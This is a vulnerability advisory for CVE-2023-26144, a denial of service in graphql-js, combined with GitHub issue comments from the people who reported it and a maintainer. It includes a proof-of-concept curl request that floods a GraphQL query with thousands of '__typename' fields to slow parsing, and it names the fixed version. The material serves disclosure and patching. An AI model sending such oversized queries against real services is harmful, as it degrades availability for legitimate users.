Are we able to get this in asap? This impacts all consumers unless they have some kind of mitigation in place (which Apollo doesn't do by itself) which I found to be the case about <30% of the time when testing a bunch of different companies

Q: should this be disclosed as a vulnerability? it's already public but consumers should upgrade asap

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)

#### Introduced: 19 Sep 2023

[CVE-2023-26144  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26144) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-400  (opens in a new tab)](https://cwe.mitre.org/data/definitions/400.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `graphql` to version 16.8.1 or higher.

## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient checks in the `OverlappingFieldsCanBeMergedRule.ts` file when parsing large queries. This vulnerability allows an attacker to degrade system performance.

**Note:** It was not proven that this vulnerability can crash the process.

## PoC

1. `pnpm install && pnpm start`
2. Run

```
curl \
--data "{\"query\":\"{ $(python3 -c "print('%s' % ('__typename ' * 1000))")}\"}" \
--header 'Content-Type: application/json' \
--include \
--request POST \
https://example.com/graphql

```

This will take ~2.5s and increase to ~21s if you change the number of \_\_typename to 3000

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).
* Crash - An attacker sending crafted requests that could cause the system to crash. For Example, [npm `ws` package](https://snyk.io/vuln/npm%3Aws%3A20171108)

### CVSS Scores

version 3.1
### Snyk

5.3 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**

| Re-posting here as advised in [apollographql/apollo-server#7688](https://github.com/apollographql/apollo-server/issues/7688). Without digging into source code I'm not exactly sure which part of graphql-js is causing this. Issue Description We've identified a potential resource exhaustion vector which has a significant impact on our CPU and response times. We're currently experiencing this on AS 3 however we're able to reproduce on AS 4.  We have a [custom query complexity calc plugin](https://github.com/tadhglewis/apollo-koa-minimal/blob/main/index.mjs#L33) which is intended to handle this scenario and others however it seems before we get to `didResolveOperation` event/stage, there is some processing that takes a long time.  I'm assuming this is an underlying dependancy in Apollo however I'm not 100% sure so any ideas or suggestions on how we can mitigate this would be great. Link to Reproduction <https://github.com/tadhglewis/apollo-koa-minimal> Reproduction Steps  1. `pnpm install && pnpm start` 2. Run  ``` curl \ --data "{\"query\":\"{ $(python3 -c "print('%s' % ('__typename ' * 1000))")}\"}" \ --header 'Content-Type: application/json' \ --include \ --request POST \ https://example.com/graphql ```  This will take ~2.5s and increase to ~21s if you change the number of `__typename` to `3000` [Screenshot 2023-08-16 at 10 33 30 pm](https://private-user-images.githubusercontent.com/53756558/261008553-3227af55-1a90-4374-bac0-4daf6e28bc55.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTI5NDcsIm5iZiI6MTczNjU1MjY0NywicGF0aCI6Ii81Mzc1NjU1OC8yNjEwMDg1NTMtMzIyN2FmNTUtMWE5MC00Mzc0LWJhYzAtNGRhZjZlMjhiYzU1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDIzNDQwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUyOTY4N2M0MmRmN2RhYmUyZWU5OTA0YWFiODEzZDFiZGNhODMxNzg3M2Q5MzllNTM5MzA5OWY4N2VmZTczNzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.O9flFo5vGPHi82aZghlNv7hpoAvrRLWnID9WvGmAYsc) Notes   * On subsequent requests there seems to be some caching and response time goes to ~10ms however if you change the number of `__typename` by one it will bypass this * This isn't limited to `__typename`, it can also be hit when using `hello` and I imagine introspection as well |

| 👋 Apollo Server maintainer here. Going to follow along on this issue to track updates. For [@IvanGoncharov](https://github.com/IvanGoncharov) 's sake it would be nice to minimize the reproduction to exclude apollo server (and add certainty that it's a `graphql-js` problem). |

| I've added a [minimal graphql-js example in the same repo](https://github.com/tadhglewis/apollo-koa-minimal). You can run it using `node graphql-js.mjs`.  The slow parsing performance is still observed here  ``` // 1000 __typename query = Took 1999.3179998397827 milliseconds // 2000 __typename query = Took 8064.870334148407 milliseconds  ```  We've also reproduced this in a real world scenario on a API and due to it's impact, I consider it a critical issue. |

| [@IvanGoncharov](https://github.com/IvanGoncharov) or others on this thread. Can we please organise a release for v16? As per [#3967](https://github.com/graphql/graphql-js/pull/3967).  I would argue this issue should not be marked complete until consumers can use a fixed version of this security/performance hole, on a stable (non-beta) release channel. |
